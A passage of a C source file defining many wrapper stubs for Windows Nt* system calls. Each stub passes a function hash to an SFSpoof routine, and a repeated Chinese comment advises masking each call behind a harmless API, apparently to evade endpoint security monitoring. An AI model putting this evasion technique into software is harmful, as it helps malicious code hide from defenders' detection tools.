    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFreezeTransactions(PLARGE_INTEGER FreezeTimeout, PLARGE_INTEGER ThawTimeout) {
    Params.param[1] = (DWORD_PTR)FreezeTimeout;
    Params.param[2] = (DWORD_PTR)ThawTimeout;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0CF9B00C0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtGetCachedSigningLevel(HANDLE File, PULONG Flags, PSE_SIGNING_LEVEL SigningLevel, PUCHAR Thumbprint, PULONG ThumbprintSize, PULONG ThumbprintAlgorithm) {
    Params.param[1] = (DWORD_PTR)File;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)SigningLevel;
    Params.param[4] = (DWORD_PTR)Thumbprint;
    Params.param[5] = (DWORD_PTR)ThumbprintSize;
    Params.param[6] = (DWORD_PTR)ThumbprintAlgorithm;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0B8FAFE48;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtGetCompleteWnfStateSubscription(PCWNF_STATE_NAME OldDescriptorStateName, PLARGE_INTEGER OldSubscriptionId, ULONG OldDescriptorEventMask, ULONG OldDescriptorStatus, PWNF_DELIVERY_DESCRIPTOR NewDeliveryDescriptor, ULONG DescriptorSize) {
    Params.param[1] = (DWORD_PTR)OldDescriptorStateName;
    Params.param[2] = (DWORD_PTR)OldSubscriptionId;
    Params.param[3] = (DWORD_PTR)OldDescriptorEventMask;
    Params.param[4] = (DWORD_PTR)OldDescriptorStatus;
    Params.param[5] = (DWORD_PTR)NewDeliveryDescriptor;
    Params.param[6] = (DWORD_PTR)DescriptorSize;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x09C03BE97;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtGetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)ThreadContext;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0F447FEF1;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtGetCurrentProcessorNumber() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x02ABB342A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtGetCurrentProcessorNumberEx(PULONG ProcNumber) {
    Params.param[1] = (DWORD_PTR)ProcNumber;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x09E90CC4A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtGetDevicePowerState(HANDLE Device, PDEVICE_POWER_STATE State) {
    Params.param[1] = (DWORD_PTR)Device;
    Params.param[2] = (DWORD_PTR)State;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0D887C339;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtGetMUIRegistryInfo(ULONG Flags, PULONG DataSize, PVOID SystemData) {
    Params.param[1] = (DWORD_PTR)Flags;
    Params.param[2] = (DWORD_PTR)DataSize;
    Params.param[3] = (DWORD_PTR)SystemData;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x004B8103D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtGetNextProcess(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Flags, PHANDLE NewProcessHandle) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)HandleAttributes;
    Params.param[4] = (DWORD_PTR)Flags;
    Params.param[5] = (DWORD_PTR)NewProcessHandle;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0F2AC0AC0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtGetNextThread(HANDLE ProcessHandle, HANDLE ThreadHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Flags, PHANDLE NewThreadHandle) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)ThreadHandle;
    Params.param[3] = (DWORD_PTR)DesiredAccess;
    Params.param[4] = (DWORD_PTR)HandleAttributes;
    Params.param[5] = (DWORD_PTR)Flags;
    Params.param[6] = (DWORD_PTR)NewThreadHandle;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0ECAEDFF1;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtGetNlsSectionPtr(ULONG SectionType, ULONG SectionData, PVOID ContextData, PVOID SectionPointer, PULONG SectionSize) {
    Params.param[1] = (DWORD_PTR)SectionType;
    Params.param[2] = (DWORD_PTR)SectionData;
    Params.param[3] = (DWORD_PTR)ContextData;
    Params.param[4] = (DWORD_PTR)SectionPointer;
    Params.param[5] = (DWORD_PTR)SectionSize;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x03D8C2C2E;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtGetNotificationResourceManager(HANDLE ResourceManagerHandle, PTRANSACTION_NOTIFICATION TransactionNotification, ULONG NotificationLength, PLARGE_INTEGER Timeout, PULONG ReturnLength, ULONG Asynchronous, ULONG AsynchronousContext) {
    Params.param[1] = (DWORD_PTR)ResourceManagerHandle;
    Params.param[2] = (DWORD_PTR)TransactionNotification;
    Params.param[3] = (DWORD_PTR)NotificationLength;
    Params.param[4] = (DWORD_PTR)Timeout;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = (DWORD_PTR)Asynchronous;
    Params.param[7] = (DWORD_PTR)AsynchronousContext;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 7;
    Params.FuncHash = 0x02DB2331A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtGetWriteWatch(HANDLE ProcessHandle, ULONG Flags, PVOID BaseAddress, ULONG RegionSize, PULONG UserAddressArray, PULONG EntriesInUserAddressArray, PULONG Granularity) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)Flags;
    Params.param[3] = (DWORD_PTR)BaseAddress;
    Params.param[4] = (DWORD_PTR)RegionSize;
    Params.param[5] = (DWORD_PTR)UserAddressArray;
    Params.param[6] = (DWORD_PTR)EntriesInUserAddressArray;
    Params.param[7] = (DWORD_PTR)Granularity;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 7;
    Params.FuncHash = 0x01C94D737;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtImpersonateAnonymousToken(HANDLE ThreadHandle) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x02B93FE30;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtImpersonateThread(HANDLE ServerThreadHandle, HANDLE ClientThreadHandle, PSECURITY_QUALITY_OF_SERVICE SecurityQos) {
    Params.param[1] = (DWORD_PTR)ServerThreadHandle;
    Params.param[2] = (DWORD_PTR)ClientThreadHandle;
    Params.param[3] = (DWORD_PTR)SecurityQos;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0A40FA2AD;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtInitializeEnclave(HANDLE ProcessHandle, PVOID BaseAddress, PVOID EnclaveInformation, ULONG EnclaveInformationLength, PULONG EnclaveError) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)EnclaveInformation;
    Params.param[4] = (DWORD_PTR)EnclaveInformationLength;
    Params.param[5] = (DWORD_PTR)EnclaveError;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0D0970B2B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtInitializeNlsFiles(PVOID BaseAddress, PLCID DefaultLocaleId, PLARGE_INTEGER DefaultCasingTableSize) {
    Params.param[1] = (DWORD_PTR)BaseAddress;
    Params.param[2] = (DWORD_PTR)DefaultLocaleId;
    Params.param[3] = (DWORD_PTR)DefaultCasingTableSize;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0E6CF1A83;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtInitializeRegistry(USHORT BootCondition) {
    Params.param[1] = (DWORD_PTR)BootCondition;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0029D342D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtInitiatePowerAction(POWER_ACTION SystemAction, SYSTEM_POWER_STATE LightestSystemState, ULONG Flags, BOOLEAN Asynchronous) {
    Params.param[1] = (DWORD_PTR)SystemAction;
    Params.param[2] = (DWORD_PTR)LightestSystemState;
    Params.param[3] = (DWORD_PTR)Flags;
    Params.param[4] = (DWORD_PTR)Asynchronous;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x024B3A6A3;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtIsSystemResumeAutomatic() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x03A9E353C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtIsUILanguageComitted() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x0D3DD2BC1;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtListenPort(HANDLE PortHandle, PPORT_MESSAGE ConnectionRequest) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = (DWORD_PTR)ConnectionRequest;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0E53EDA8D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtLoadDriver(PUNICODE_STRING DriverServiceName) {
    Params.param[1] = (DWORD_PTR)DriverServiceName;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x088C36B99;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtLoadEnclaveData(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, ULONG Protect, PVOID PageInformation, ULONG PageInformationLength, PSIZE_T NumberOfBytesWritten, PULONG EnclaveError) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)Buffer;
    Params.param[4] = (DWORD_PTR)BufferSize;
    Params.param[5] = (DWORD_PTR)Protect;
    Params.param[6] = (DWORD_PTR)PageInformation;
    Params.param[7] = (DWORD_PTR)PageInformationLength;
    Params.param[8] = (DWORD_PTR)NumberOfBytesWritten;
    Params.param[9] = (DWORD_PTR)EnclaveError;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x0C3A1ED2F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtLoadHotPatch(PUNICODE_STRING HotPatchName, ULONG LoadFlag) {
    Params.param[1] = (DWORD_PTR)HotPatchName;
    Params.param[2] = (DWORD_PTR)LoadFlag;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0A8A3A206;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtLoadKey(POBJECT_ATTRIBUTES TargetKey, POBJECT_ATTRIBUTES SourceFile) {
    Params.param[1] = (DWORD_PTR)TargetKey;
    Params.param[2] = (DWORD_PTR)SourceFile;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x02380465C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtLoadKey2(POBJECT_ATTRIBUTES TargetKey, POBJECT_ATTRIBUTES SourceFile, ULONG Flags) {
    Params.param[1] = (DWORD_PTR)TargetKey;
    Params.param[2] = (DWORD_PTR)SourceFile;
    Params.param[3] = (DWORD_PTR)Flags;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x07FA3B43A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtLoadKeyEx(POBJECT_ATTRIBUTES TargetKey, POBJECT_ATTRIBUTES SourceFile, ULONG Flags, HANDLE TrustClassKey, HANDLE Event, ACCESS_MASK DesiredAccess, PHANDLE RootHandle, PIO_STATUS_BLOCK IoStatus) {
    Params.param[1] = (DWORD_PTR)TargetKey;
    Params.param[2] = (DWORD_PTR)SourceFile;
    Params.param[3] = (DWORD_PTR)Flags;
    Params.param[4] = (DWORD_PTR)TrustClassKey;
    Params.param[5] = (DWORD_PTR)Event;
    Params.param[6] = (DWORD_PTR)DesiredAccess;
    Params.param[7] = (DWORD_PTR)RootHandle;
    Params.param[8] = (DWORD_PTR)IoStatus;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 8;
    Params.FuncHash = 0x06BDC5F67;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtLockFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PULARGE_INTEGER ByteOffset, PULARGE_INTEGER Length, ULONG Key, BOOLEAN FailImmediately, BOOLEAN ExclusiveLock) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)Event;
    Params.param[3] = (DWORD_PTR)ApcRoutine;
    Params.param[4] = (DWORD_PTR)ApcContext;
    Params.param[5] = (DWORD_PTR)IoStatusBlock;
    Params.param[6] = (DWORD_PTR)ByteOffset;
    Params.param[7] = (DWORD_PTR)Length;
    Params.param[8] = (DWORD_PTR)Key;
    Params.param[9] = (DWORD_PTR)FailImmediately;
    Params.param[10] = (DWORD_PTR)ExclusiveLock;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 10;
    Params.FuncHash = 0x014C74670;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtLockProductActivationKeys(PULONG pPrivateVer, PULONG pSafeMode) {
    Params.param[1] = (DWORD_PTR)pPrivateVer;
    Params.param[2] = (DWORD_PTR)pSafeMode;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x03BA72FCC;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtLockRegistryKey(HANDLE KeyHandle) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0C543E8E4;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtLockVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PULONG RegionSize, ULONG MapType) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)RegionSize;
    Params.param[4] = (DWORD_PTR)MapType;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x003910913;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtMakePermanentObject(HANDLE Handle) {
    Params.param[1] = (DWORD_PTR)Handle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x09AC70ACB;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtMakeTemporaryObject(HANDLE Handle) {
    Params.param[1] = (DWORD_PTR)Handle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
